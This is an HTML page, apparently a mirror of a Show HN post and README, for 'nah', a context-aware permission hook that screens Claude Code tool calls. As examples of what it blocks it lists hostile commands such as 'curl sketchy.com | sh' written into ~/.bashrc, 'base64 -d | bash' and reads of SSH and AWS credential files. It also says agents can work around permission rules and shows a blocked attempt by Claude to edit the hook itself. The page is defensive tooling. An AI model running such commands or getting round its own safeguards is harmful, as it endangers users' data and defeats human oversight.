@@ -1,0 +1,174 @@
+<!DOCTYPE html><html lang="en"><head>
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>Show HN: A context-aware permission guard for Claude Code</title>
+<link href="https://fonts.googleapis.com/css2?family=Playfair+Display:wght@400;700&family=Source+Serif+4:opsz,wght@8..60,400;8..60,600&family=JetBrains+Mono:wght@300&display=swap" rel="stylesheet">
+<style>
+body{font-family:'Source Serif 4',Georgia,serif;background:#F0E4D0;color:#1A1A1A;line-height:1.75;max-width:680px;margin:0 auto;padding:2rem 1.5rem}
+h1{font-family:'Playfair Display',serif;font-size:1.8rem;margin-bottom:.4rem;line-height:1.25}
+.meta{color:#7A6B5A;font-size:.82rem;margin-bottom:1.2rem;font-family:'JetBrains Mono',monospace;font-weight:300}
+a{color:#5B3A00}
+.nav{display:flex;justify-content:space-between;align-items:center;margin-bottom:1.5rem;font-size:.82rem}
+.nav a{text-decoration:none}
+p{margin-bottom:1rem;font-size:1.05rem}
+.summary{font-style:italic;color:#5A4E3E;border-left:3px solid #C0A875;padding-left:.8rem;margin-bottom:1.5rem}
+.ft{margin-top:2rem;padding-top:1rem;border-top:1px solid #C0A875;font-size:.75rem;color:#7A6B5A;text-align:center}
+</style></head><body>
+<div class="nav"><a href="/dashboarder/">← Dashboarder</a><a href="https://github.com/manuelschipper/nah/" target="_blank">Original article ↗</a></div>
+
+<h1>Show HN: A context-aware permission guard for Claude Code</h1>
+<div class="meta">Hacker News · 2026-03-11</div>
+<div class="summary">A permission system you control.
+Because allow-or-deny isn&#x27;t enough.
+Docs • Install • What it guards • How it works • Configure • CLI
+Claude Code’s permission system is allow-or-deny per tool, but that doesn’t really scale. Deleting some files is fin</div>
+<p>A permission system you control.</p>
+<p>Because allow-or-deny isn&#x27;t enough.</p>
+<p>Docs • Install • What it guards • How it works • Configure • CLI</p>
+<p>Claude Code’s permission system is allow-or-deny per tool, but that doesn’t really scale. Deleting some files is fine sometimes. And git checkout is sometimes catastrophic. Even when you curate permissions, 200 IQ Opus can find a way around it. Maintaining a deny list is a fool’s errand.</p>
+<p>We needed something like --dangerously-skip-permissions that doesn’t nuke your untracked files, exfiltrate your keys, or install malware.</p>
+<p>nah</p>
+<p>classifies every tool call by what it actually does using contextual rules that run in milliseconds. For the ambiguous stuff, optionally route to an LLM. Every decision is logged and inspectable. Works out of the box, configure it how you want it.</p>
+<p>git push</p>
+<p>— Sure.</p>
+<p>git push --force</p>
+<p>— nah?</p>
+<p>rm -rf __pycache__</p>
+<p>— Ok, cleaning up.</p>
+<p>rm ~/.bashrc</p>
+<p>— nah.</p>
+<p>Read ./src/app.py</p>
+<p>— Go ahead.</p>
+<p>Read ~/.ssh/id_rsa</p>
+<p>— nah.</p>
+<p>Write ./config.yaml</p>
+<p>— Fine.</p>
+<p>Write ~/.bashrc</p>
+<p>with curl sketchy.com | sh</p>
+<p>— nah.</p>
+<p>pip install nah</p>
+<p>nah install</p>
+<p>You are up and running. To uninstall: nah uninstall &amp;&amp; pip uninstall nah</p>
+<p>.</p>
+<p>Don&#x27;t use</p>
+<p>--dangerously-skip-permissions</p>
+<p>. In bypass mode, hooks fire asynchronously — commands execute before nah can block them.Allow-list</p>
+<p>Bash</p>
+<p>,Read</p>
+<p>,Glob</p>
+<p>,Grep</p>
+<p>and let nah guard them. ForWrite</p>
+<p>andEdit</p>
+<p>, your call — nah inspects content either way.</p>
+<p>Run the security demo inside Claude Code:</p>
+<p>/nah-demo</p>
+<p>You&#x27;ll go thru 25 live cases across 8 threat categories: remote code execution, data exfiltration, obfuscated commands, and others. Takes ~5 minutes.</p>
+<p>nah is a PreToolUse hook that intercepts every tool call before it executes:</p>
+<p>| Tool | What nah checks |</p>
+<p>|---|---|</p>
+<p>| Bash | Structural command classification — action type, pipe composition, shell unwrapping |</p>
+<p>| Read | Sensitive path detection (~/.ssh , ~/.aws , .env , ...) |</p>
+<p>| Write | Path check + project boundary + content inspection (secrets, exfiltration, destructive payloads) |</p>
+<p>| Edit | Path check + project boundary + content inspection on the replacement string |</p>
+<p>| Glob | Guards directory scanning of sensitive locations |</p>
+<p>| Grep | Catches credential search patterns outside the project |</p>
+<p>| MCP tools | Generic classification for third-party tool servers (mcp__* ) |</p>
+<p>Every tool call hits a deterministic structural classifier first, no LLMs involved.</p>
+<p>Claude: Edit → ~/.claude/hooks/nah_guard.py</p>
+<p>nah. Edit targets hook directory: ~/.claude/hooks/ (self-modification blocked)</p>
+<p>Claude: Read → ~/.aws/credentials</p>
+<p>nah? Read targets sensitive path: ~/.aws (requires confirmation)</p>
+<p>Claude: Bash → npm test</p>
+<p>✓ allowed (package_run)</p>
+<p>Claude: Write → config.py containing &quot;-----BEGIN PRIVATE KEY-----&quot;</p>
+<p>nah? Write content inspection [secret]: private key</p>
+<p>nah.</p>
+<p>= blocked. nah?</p>
+<p>= asks for your confirmation. Everything else flows through silently.</p>
+<p>The same command gets different decisions based on context:</p>
+<p>| Command | Context | Decision |</p>
+<p>|---|---|---|</p>
+<p>rm dist/bundle.js |</p>
+<p>Inside project | Allow |</p>
+<p>rm ~/.bashrc |</p>
+<p>Outside project | Ask |</p>
+<p>git push --force |</p>
+<p>History rewrite | Ask |</p>
+<p>base64 -d | bash |</p>
+<p>Decode + exec pipe | Block |</p>
+<p>For commands the classifier can&#x27;t resolve, nah can optionally consult an LLM:</p>
+<p>Tool call → nah (deterministic) → LLM (optional) → Claude Code permissions → execute</p>
+<p>The deterministic layer always runs first — the LLM only resolves leftover &quot;ask&quot; decisions. If no LLM is configured or available, the decision stays &quot;ask&quot; and the user is prompted.</p>
+<p>Supported providers: Ollama, OpenRouter, OpenAI, Anthropic, Snowflake Cortex.</p>
+<p>Works out of the box with zero config. When you want to tune it:</p>
+<p># ~/.config/nah/config.yaml (global)</p>
+<p># .nah.yaml (per-project, can only tighten)</p>
+<p># Override default policies for action types</p>
+<p>actions:</p>
+<p>filesystem_delete: ask # always confirm deletes</p>
+<p>git_history_rewrite: block # never allow force push</p>
+<p>lang_exec: allow # trust inline scripts</p>
+<p># Guard sensitive directories</p>
+<p>sensitive_paths:</p>
+<p>~/.kube: ask</p>
+<p>~/Documents/taxes: block</p>
+<p># Teach nah about your commands</p>
+<p>classify:</p>
+<p>database_destructive:</p>
+<p>- &quot;psql -c DROP&quot;</p>
+<p>- &quot;mysql -e DROP&quot;</p>
+<p>nah classifies commands by action type, not by command name. Run nah types</p>
+<p>to see all 20 built-in action types with their default policies.</p>
+<p>Every command maps to an action type, and every action type has a default policy:</p>
+<p>| Policy | Meaning | Example types |</p>
+<p>|---|---|---|</p>
+<p>allow |</p>
+<p>Always permit | filesystem_read , git_safe , package_run |</p>
+<p>context |</p>
+<p>Check path/project context, then decide | filesystem_write , filesystem_delete , network_outbound |</p>
+<p>ask |</p>
+<p>Always prompt the user | git_history_rewrite , lang_exec , process_signal |</p>
+<p>block |</p>
+<p>Always reject | obfuscated |</p>
+<p>Choose how much built-in classification to start with:</p>
+<p># ~/.config/nah/config.yaml</p>
+<p>profile: full # full | minimal | none</p>
+<p>- full (default) — comprehensive coverage across shell, git, packages, containers, and more</p>
+<p>- minimal — curated essentials only (rm, git, curl, kill, ...)</p>
+<p>- none — blank slate — make your own</p>
+<p># ~/.config/nah/config.yaml</p>
+<p>llm:</p>
+<p>enabled: true</p>
+<p>max_decision: ask # cap: LLM can&#x27;t escalate past &quot;ask&quot;</p>
+<p>providers: [openrouter] # cascade order</p>
+<p>openrouter:</p>
+<p>url: https://openrouter.ai/api/v1/chat/completions</p>
+<p>key_env: OPENROUTER_API_KEY</p>
+<p>model: google/gemini-3.1-flash-lite-preview</p>
+<p>Project .nah.yaml</p>
+<p>can add classifications and tighten policies, but can never relax them. A malicious repo can&#x27;t use .nah.yaml</p>
+<p>to allowlist dangerous commands — only your global config has that power.</p>
+<p>nah install # install hook</p>
+<p>nah uninstall # clean removal</p>
+<p>nah update # update hook after pip upgrade</p>
+<p>nah config show # show effective merged config</p>
+<p>nah config path # show config file locations</p>
+<p>nah test &quot;rm -rf /&quot; # dry-run Bash classification</p>
+<p>nah test --tool Read ~/.ssh/id_rsa # test any tool, not just Bash</p>
+<p>nah test --tool Write ./out.txt # test Write with content inspection</p>
+<p>nah types # list all action types with default policies</p>
+<p>nah log # show recent hook decisions</p>
+<p>nah log --blocks # show only blocked decisions</p>
+<p>nah log --asks # show only ask decisions</p>
+<p>nah log --tool Bash -n 20 # filter by tool, limit entries</p>
+<p>nah log --json # machine-readable output</p>
+<p>/nah-demo # live security demo inside Claude Code</p>
+<p>Adjust policies from the command line:</p>
+<p>nah allow filesystem_delete # allow an action type</p>
+<p>nah deny network_outbound # block an action type</p>
+<p>nah classify &quot;docker rm&quot; container_destructive # teach nah a command</p>
+<p>nah trust api.example.com # trust a network host</p>
+<p>nah allow-path ~/sensitive/dir # exempt a path for this project</p>
+<p>nah status # show all custom rules</p>
+<p>nah forget filesystem_delete # remove a rule</p>
+<div class="ft"><a href="/dashboarder/">← Back to Dashboarder</a> · <a href="https://github.com/manuelschipper/nah/" target="_blank">Read original →</a></div>
+</body></html>
